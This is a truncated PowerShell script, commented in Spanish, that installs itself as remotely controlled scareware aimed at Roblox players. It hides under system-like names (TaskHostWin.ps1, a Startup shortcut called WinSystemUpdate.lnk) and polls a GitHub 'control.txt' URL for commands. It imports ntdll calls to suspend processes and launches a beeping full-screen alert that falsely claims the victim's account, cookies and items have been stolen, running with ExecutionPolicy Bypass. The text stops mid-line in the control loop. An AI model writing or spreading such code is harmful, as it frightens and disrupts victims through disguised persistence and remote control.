# --- CONFIGURACIÓN DE RUTAS ---
$dir = "$env:LOCALAPPDATA\WinSystem"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory }

$psFile = "$dir\TaskHostWin.ps1"
$vbsFile = "$dir\Launcher.vbs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"

# --- 1. MOTOR DE CONTROL (TaskHostWin.ps1) ---
$psContent = @'
$controlUrl = "https://raw.githubusercontent.com/polgatiz/lox/main/control.txt"
$windowTitle = "*Roblox*"

function MostrarHacker($l1, $l2) {
    $ascii = @"
                .........................
             .:iiiiiiiiiiiiiiiiiiiiiiiiii:.
           :iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii:
         :iii      iiiiiiiiiiiiiiii      iii:
        iiii   ---  iiiiiiiiiiiiii  ---   iiii
       iiii   | X |  iiiiiiiiiiii  | X |   iiii
       iiii    ---  iiiiiiiiiiiiii   ---    iiii
       iiii        iiiiiiiiiiiiiiii        iiii
       iiiiiiiiiiiiiiiiii    iiiiiiiiiiiiiiiiii
        iiiiiiiiiiiiiiii      iiiiiiiiiiiiiiii
         iiiiiiiiiiiii  XXXXXX  iiiiiiiiiiiii
          iiiiiiiiiiii  XXXXXX  iiiiiiiiiiii
            iiiiiiiiii          iiiiiiiiii
              iiiiiiiiiiiiiiiiiiiiiiiiii

      [ALERTA DE SEGURIDAD: CUENTA COMPROMETIDA]
      ------------------------------------------
      INICIANDO SECUESTRO DE CUENTA ROBLOX...
      EXTRAYENDO COOKIES DE SESIÓN........... [OK]
      CAMBIANDO CONTRASEÑA Y PIN............. [OK]
      VACIANDO INVENTARIO DE ITEMS........... [OK]
      $l1
      $l2
      ------------------------------------------
      ESTADO: TRANSFERENCIA EN CURSO (94%)
"@
    $pathS = "$env:TEMP\syserr.ps1"
    $c = "$Host.UI.RawUI.BackgroundColor='Black';$Host.UI.RawUI.ForegroundColor='Red';Clear-Host;Write-Host '$ascii';for(`$i=0;`$i -lt 10;`$i++){[Console]::Beep(200,150);[Console]::Beep(100,150)};Read-Host 'ERROR DE CONEXION: LA CUENTA NO PUEDE SER RECUPERADA'"
    Set-Content -Path $pathS -Value $c -Force
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass", "-File", "`"$pathS`"" -WindowStyle Maximized
}

try { 
    $api = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("ntdll.dll")] public static extern uint NtSuspendProcess(IntPtr h);
        [DllImport("ntdll.dll")] public static extern uint NtResumeProcess(IntPtr h);
    }
"@
    Add-Type -TypeDefinition $api -ErrorAction SilentlyContinue 
} catch {}

while($true) {
    try {
        $raw = (Invoke-WebRequest -
